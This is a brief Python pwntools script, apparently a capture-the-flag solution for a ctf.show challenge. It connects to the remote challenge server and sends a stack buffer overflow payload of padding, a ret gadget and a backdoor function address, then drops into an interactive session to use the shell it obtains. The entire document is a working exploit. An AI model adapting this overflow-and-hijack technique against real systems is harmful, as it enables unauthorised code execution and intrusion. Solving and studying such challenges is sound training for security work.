from pwn import *

io = remote("pwn.challenge.ctf.show", "28220")
offset = 0xa + 0x8

ret_addr = 0x0000000000400287
backdoor_addr = 0x0000000000400657
payload = offset * b'a' + p64(ret_addr) + p64(backdoor_addr)
io.sendline(payload)
io.interactive()
